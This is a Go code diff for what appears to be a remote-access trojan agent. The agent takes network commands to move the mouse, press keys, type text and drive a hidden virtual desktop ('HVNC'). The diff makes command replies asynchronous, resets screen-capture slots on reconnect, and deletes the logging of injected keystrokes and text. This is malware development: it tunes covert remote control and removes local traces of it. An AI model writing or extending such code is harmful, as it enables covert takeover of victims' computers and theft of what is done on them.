@@ -81,6 +81,7 @@ func resetForReconnect(env *runtime.Env) {
 	}
 
 	cancelAllCommands()
+	capture.ResetFrameSlots()
 
 	env.DesktopMu.Lock()
 	if env.DesktopCancel != nil {
@@ -352,6 +353,10 @@ func sendCommandResultSafe(env *runtime.Env, cmdID string, ok bool, message stri
 	if err := wire.WriteMsg(context.Background(), env.Conn, res); err != nil {
 		log.Printf("command_result send failed: %v", err)
 	}
+}
+
+func sendCommandResultAsync(env *runtime.Env, cmdID string) {
+	go sendCommandResultSafe(env, cmdID, true, "")
 }
 
 func payloadNumberToInt64(value interface{}) int64 {
@@ -754,7 +759,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return nil
 	case "desktop_mouse_move":
 		if !env.MouseControl {
-			sendCommandResultSafe(env, cmdID, true, "")
+			sendCommandResultAsync(env, cmdID)
 			return nil
 		}
 		payload := payloadAsMap(envelope["payload"])
@@ -762,11 +767,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		y, _ := payloadInt32(payload, "y")
 		absX, absY := resolveDesktopPoint(env.SelectedDisplay, x, y)
 		setCursorPos(absX, absY)
-		sendCommandResultSafe(env, cmdID, true, "")
+		sendCommandResultAsync(env, cmdID)
 		return nil
 	case "desktop_mouse_down":
 		if !env.MouseControl {
-			sendCommandResultSafe(env, cmdID, true, "")
+			sendCommandResultAsync(env, cmdID)
 			return nil
 		}
 		payload := payloadAsMap(envelope["payload"])
@@ -778,11 +783,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		sendMouseDown(btn)
-		sendCommandResultSafe(env, cmdID, true, "")
+		sendCommandResultAsync(env, cmdID)
 		return nil
 	case "desktop_mouse_up":
 		if !env.MouseControl {
-			sendCommandResultSafe(env, cmdID, true, "")
+			sendCommandResultAsync(env, cmdID)
 			return nil
 		}
 		payload := payloadAsMap(envelope["payload"])
@@ -794,11 +799,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		sendMouseUp(btn)
-		sendCommandResultSafe(env, cmdID, true, "")
+		sendCommandResultAsync(env, cmdID)
 		return nil
 	case "desktop_key_down":
 		if !env.KeyboardControl {
-			sendCommandResultSafe(env, cmdID, true, "")
+			sendCommandResultAsync(env, cmdID)
 			return nil
 		}
 		payload, _ := envelope["payload"].(map[string]interface{})
@@ -809,14 +814,13 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if vk := keyCodeToVK(code); vk != 0 {
-			log.Printf("desktop: key down code=%s vk=%d", code, vk)
 			sendKeyDown(vk)
 		}
-		sendCommandResultSafe(env, cmdID, true, "")
+		sendCommandResultAsync(env, cmdID)
 		return nil
 	case "desktop_key_up":
 		if !env.KeyboardControl {
-			sendCommandResultSafe(env, cmdID, true, "")
+			sendCommandResultAsync(env, cmdID)
 			return nil
 		}
 		payload, _ := envelope["payload"].(map[string]interface{})
@@ -827,14 +831,13 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if vk := keyCodeToVK(code); vk != 0 {
-			log.Printf("desktop: key up code=%s vk=%d", code, vk)
 			sendKeyUp(vk)
 		}
-		sendCommandResultSafe(env, cmdID, true, "")
+		sendCommandResultAsync(env, cmdID)
 		return nil
 	case "desktop_text":
 		if !env.KeyboardControl {
-			sendCommandResultSafe(env, cmdID, true, "")
+			sendCommandResultAsync(env, cmdID)
 			return nil
 		}
 		payload, _ := envelope["payload"].(map[string]interface{})
@@ -845,10 +848,9 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if text != "" {
-			log.Printf("desktop: text input len=%d", len(text))
 			sendTextInput(text)
 		}
-		sendCommandResultSafe(env, cmdID, true, "")
+		sendCommandResultAsync(env, cmdID)
 		return nil
 
 	// ==================== HVNC COMMANDS ====================
@@ -1316,7 +1318,6 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if vk := keyCodeToVKHVNC(code); vk != 0 {
-			log.Printf("hvnc: key down code=%s vk=%d", code, vk)
 			enqueueHVNCInput(hvncInputEvent{kind: hvncInputKeyDown, vk: vk})
 		}
 		return nil
@@ -1333,7 +1334,6 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if vk := keyCodeToVKHVNC(code); vk != 0 {
-			log.Printf("hvnc: key up code=%s vk=%d", code, vk)
 			enqueueHVNCInput(hvncInputEvent{kind: hvncInputKeyUp, vk: vk})
 		}
 		return nil
